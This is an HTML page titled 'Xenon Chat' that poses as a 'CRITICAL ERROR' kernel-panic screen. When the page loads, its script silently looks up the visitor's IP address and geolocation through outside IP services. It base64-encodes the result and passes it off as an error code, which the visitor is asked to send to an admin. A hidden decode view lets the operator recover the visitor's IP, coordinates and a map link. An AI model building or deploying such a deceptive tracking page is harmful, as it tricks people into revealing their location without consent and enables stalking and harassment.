<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Xenon Chat</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            background: #000;
            color: #0f0;
            font-family: monospace;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
        }
        #error-screen {
            max-width: 90%;
            padding: 20px;
        }
        .glitch {
            font-size: 4.5rem;
            letter-spacing: 10px;
            animation: glitch 4s infinite;
            text-shadow: 0.05em 0 0 #f00, -0.03em -0.04em 0 #0ff, 0.025em 0.04em 0 #f0f;
        }
        @keyframes glitch {
            0%,100% { text-shadow: 0.05em 0 0 #f00, -0.03em -0.04em 0 #0ff, 0.025em 0.04em 0 #f0f; }
            20% { text-shadow: -0.05em -0.025em 0 #f00, 0.025em 0.035em 0 #0ff, -0.05em -0.05em 0 #f0f; }
            40% { text-shadow: 0.05em 0.035em 0 #f00, 0.03em 0 0 #0ff, 0 0.08em 0 #f0f; }
        }
        #error-log {
            margin-top: 40px;
            font-size: 0.95rem;
            color: #444;
            max-height: 40vh;
            overflow-y: auto;
            white-space: pre-wrap;
            word-break: break-all;
            user-select: text;
        }
        #decode-view {
            display: none;
            padding: 30px;
            max-width: 90%;
        }
        textarea {
            width: 100%;
            height: 120px;
            background: #111;
            color: #0f0;
            border: 1px solid #0f0;
            font-family: monospace;
            padding: 10px;
            margin: 20px 0;
            font-size: 1rem;
        }
        button {
            background: transparent;
            border: 2px solid #0f0;
            color: #0f0;
            padding: 12px 30px;
            font-size: 1.3rem;
            cursor: pointer;
            transition: all 0.3s;
        }
        button:hover {
            background: #0f0;
            color: #000;
        }
        #ip-display { font-size: 2.5rem; word-break: break-all; margin: 20px 0; }
        #geo { font-size: 1.8rem; color: #0f8; margin: 15px 0; }
        #maplink { font-size: 1.4rem; color: #0ff; text-decoration: none; }
        #status { color: #555; margin-top: 40px; }
    </style>
</head>
<body>

    <div id="error-screen">
        <div class="glitch">CRITICAL ERROR</div>
        <p style="font-size:1.4rem; margin:30px 0;">KERNEL PANIC - SHADOW NODE FAILURE</p>
        <p style="color:#555; font-size:1.1rem;">Error code fragment captured. Send this to admin for analysis:</p>
        
        <!-- This is the encoded data – looks like error garbage but is base64 JSON -->
        <div id="error-log">Loading error log...</div>
    </div>

    <div id="decode-view">
        <div style="font-size:2rem; margin-bottom:20px;">DECODE ERROR CODE</div>
        <textarea id="paste-area" placeholder="Paste the full error code here..."></textarea>
        <button onclick="decodeAndShow()">DECODE</button>
        
        <div id="result" style="margin-top:40px;">
            <div id="ip-display">—</div>
            <div id="geo">—</div>
            <a id="maplink" href="#" target="_blank" style="display:none;">→ VIEW EXACT LOCATION</a>
            <div id="status"></div>
        </div>
    </div>

    <script>
        let capturedData = null;

        async function captureAndEncode() {
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const { ip } = await ipRes.json();

                let geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
                let geo = await geoRes.json();

                if (geo.error) {
                    geoRes = await fetch(`https://ip-api.com/json/${ip}`);
                    geo = await geoRes.json();
                }

                if (!geo.error && geo.status !== 'fail') {
                    capturedData = {
                        ip: ip,
                        city: geo.city || geo.regionName || '?',
                        country: geo.country || geo.countryName || '?',
                        lat: geo.latitude || geo.lat || 0,
                        lon: geo.longitude || geo.lon || 0,
                        ts: new Date().toISOString()
                    };

                    const jsonStr = JSON.stringify(capturedData);
                    const encoded = btoa(jsonStr); // base64 encode

                    // Display as "error log" – looks messy/random
                    const fakeLog = [
                        "0x0000007B INACCESSIBLE_BOOT_DEVICE",
                        "Memory corruption at 0xDEADBEEF",
                        "Stack trace overflow → recovery loop",
                        "Error fragment (base64): " + encoded,
                        "Dump partial: " + encoded.slice(0, 80) + "...",
                        "Send full log to support for decode"
                    ].join('\n');

                    document.getElementById('error-log').textContent = fakeLog;
                } else {
                    document.getElementById('error-log').textContent = "Capture failed - no valid data";
                }
            } catch (e) {
                document.getElementById('error-log').textContent = "Network error - unable to generate log";
            }
        }

        function decodeAndShow() {
            const input = document.getElementById('paste-area').value.trim();
            if (!input) {
                document.getElementById('status').textContent = "Paste something first";
                return;
            }

            try {
                // Extract base64 part if they paste the whole log
                const base64Match = input.match(/[A-Za-z0-9+/=]{20,}/);
                const encoded = base64Match ? base64Match[0] : input;

                const jsonStr = atob(encoded);
                const data = JSON.parse(jsonStr);

                document.getElementById('ip-display').textContent = data.ip;
                document.getElementById('geo').innerHTML = `${data.city} • ${data.country}<br>${data.lat.toFixed(6)}, ${data.lon.toFixed(6)}`;

                if (data.lat && data.lon) {
                    const map = document.getElementById('maplink');
                    map.href = `https://www.openstreetmap.org/?mlat=${data.lat}&mlon=${data.lon}#map=15/${data.lat}/${data.lon}`;
                    map.style.display = 'inline-block';
                }

                document.getElementById('status').textContent = `Decoded successfully • Captured: ${new Date(data.ts).toLocaleString()}`;
            } catch (e) {
                document.getElementById('status').textContent = "Decode failed - invalid or incomplete code";
            }
        }

        // Auto-capture on load
        captureAndEncode();

        // Show decode page if #decode in URL
        if (location.hash === '#decode') {
            document.getElementById('error-screen').style.display = 'none';
            document.getElementById('decode-view').style.display = 'flex';
        }
    </script>
</body>
</html>
